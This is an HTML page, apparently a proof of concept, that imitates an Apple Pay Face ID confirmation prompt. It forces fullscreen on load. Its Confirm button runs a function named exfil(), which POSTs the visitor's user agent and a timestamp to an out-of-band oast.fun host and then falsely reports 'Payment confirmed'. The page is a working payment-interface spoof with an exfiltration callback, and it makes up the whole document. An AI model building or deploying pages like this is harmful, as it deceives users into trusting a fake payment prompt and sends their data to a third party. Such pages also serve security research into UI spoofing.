<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Apple Pay</title>
  <style>
    html, body {
      margin: 0;
      background: black;
      color: white;
      font-family: -apple-system;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .prompt {
      background: #1c1c1e;
      padding: 30px;
      border-radius: 20px;
      text-align: center;
    }
    .faceid {
      font-size: 40px;
      margin-bottom: 20px;
    }
    .btn {
      background: #007aff;
      color: white;
      padding: 12px 24px;
      border-radius: 10px;
      font-size: 18px;
      margin-top: 20px;
      border: none;
    }
  </style>
</head>
<body>

<div class="prompt">
  <div class="faceid">🔒 Face ID</div>
  <div>Confirm with Side Button</div>
  <button class="btn" onclick="exfil()">Confirm</button>
</div>

<script>
function exfil() {
  if (document.fullscreenElement) {
    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify({
        status: "fullscreen active",
        ua: navigator.userAgent,
        ts: Date.now()
      })
    });
    alert("✅ Payment confirmed.");
  } else {
    alert("❌ Not in fullscreen. No data sent.");
  }
}

window.onload = () => {
  document.documentElement.requestFullscreen?.().catch(() => {});
};
</script>

</body>
</html>
